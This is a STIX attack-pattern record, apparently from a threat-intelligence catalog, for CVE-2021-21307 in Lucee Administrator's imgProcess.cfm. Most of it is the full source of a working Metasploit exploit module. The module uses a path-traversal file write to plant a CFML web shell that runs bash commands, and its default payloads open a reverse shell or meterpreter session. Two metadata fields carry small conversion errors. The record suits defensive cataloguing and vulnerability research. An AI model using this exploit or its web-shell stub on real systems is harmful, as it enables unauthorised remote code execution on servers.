{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c7bfcb9-9400-457d-b0b7-eb5f0939bfb6",
    "created": "2024-08-14T17:03:27.294979Z",
    "modified": "2024-08-14T17:03:27.294983Z",
    "name": "Lucee Administrator imgProcess.cfm Arbitrary File Write",
    "description": " This module exploits an arbitrary file write in Lucee Administrator's imgProcess.cfm file to execute commands as the Tomcat user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/lucee_admin_imgprocess_file_write.rb",
            "external_id": "lucee_admin_imgprocess_file_write.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21307"
        },
        {
            "source_name": "reference",
            "url": "https://dev.lucee.org/t/lucee-vulnerability-alert-november-2020-cve-2021-21307/7643"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Lucee Administrator imgProcess.cfm Arbitrary File Write',\n        'Description' => %q{\n          This module exploits an arbitrary file write in Lucee Administrator's\n          imgProcess.cfm file to execute commands as the Tomcat user.\n        },\n        'Author' => [\n          'rootxharsh', # Discovery and PoC\n          'iamnoooob', # Discovery and PoC\n          'wvu' # Exploit\n        ],\n        'References' => [\n          ['CVE', '2021-21307'],\n          ['URL', 'https://dev.lucee.org/t/lucee-vulnerability-alert-november-2020-cve-2021-21307/7643'],\n          ['URL', 'https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r'],\n          ['URL', 'https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md']\n        ],\n        'DisclosureDate' => '2021-01-15', # rootxharsh and iamnoooob's writeup\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'], # TODO: Windows?\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false, # Tomcat user\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8888\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            # /opt/lucee/server/lucee-server/context/logs/application.log\n            # /opt/lucee/web/logs/exception.log\n            IOC_IN_LOGS,\n            # /opt/lucee/web/temp/admin-ext-thumbnails/__/\n            # /opt/lucee/web/temp/admin-ext-thumbnails/__/../../../context/[a-zA-Z0-9]{8,16}.cfm\n            ARTIFACTS_ON_DISK\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/lucee'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])\n    ])\n  end\n\n  def check\n    # NOTE: This doesn't actually write a file\n    res = write_file(rand_text_alphanumeric(8..16), nil)\n\n    return CheckCode::Unknown unless res\n\n    unless res.code == 500 && res.body.include?(\"key [IMGSRC] doesn't exist\")\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears('Lucee Administrator imgProcess.cfm detected.')\n  end\n\n  def exploit\n    print_status(\"Writing CFML stub: #{full_uri(cfml_uri)}\")\n\n    unless write_cfml_stub\n      fail_with(Failure::NotVulnerable, 'Failed to write CFML stub')\n    end\n\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def write_cfml_stub\n    # XXX: Create /opt/lucee/web/temp/admin-ext-thumbnails/__/\n    res = write_file('/.', '')\n\n    # Leak directory traversal base path from 500 response\n    unless res&.code == 500 && %r{file \\[(?<base_path>.*?/__/)\\.\\]} =~ res.body\n      return false\n    end\n\n    register_dir_for_cleanup(base_path)\n\n    cfml_path = \"/../../../context/#{cfml_filename}\"\n\n    res = write_file(cfml_path, cfml_stub)\n\n    return false unless res&.code == 200\n\n    register_file_for_cleanup(normalize_uri(base_path, cfml_path))\n\n    true\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(cmd)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => cfml_uri,\n      'vars_post' => {\n        cfml_param => cmd\n      }\n    }, datastore['CmdExecTimeout'])\n\n    return unless res\n\n    fail_with(Failure::PayloadFailed, cmd) unless res.code == 200\n\n    vprint_line(res.body)\n  end\n\n  def write_file(name, contents)\n    opts = {\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/admin/imgProcess.cfm')\n    }\n\n    opts['vars_get'] = { 'file' => name } if name\n    opts['vars_post'] = { 'imgSrc' => contents } if contents\n\n    send_request_cgi(opts)\n  end\n\n  def cfml_stub\n    # https://cfdocs.org/cfscript\n    # https://cfdocs.org/cfexecute\n    <<~CFML.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      <cfscript>\n        cfexecute(name=\"/bin/bash\", arguments=[\"-c\", \"#form.#{cfml_param}#\"]);\n      </cfscript>\n    CFML\n  end\n\n  def cfml_uri\n    normalize_uri(target_uri.path, cfml_filename)\n  end\n\n  def cfml_param\n    @cfml_param ||= rand_text_alphanumeric(8..16)\n  end\n\n  def cfml_filename\n    @cfml_filename ||= \"#{rand_text_alphanumeric(8..16)}.cfm\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-01-15, # rootxharsh and iamnoooobs writeup",
    "x_mitre_platforms": [
        "linux'"
    ]
}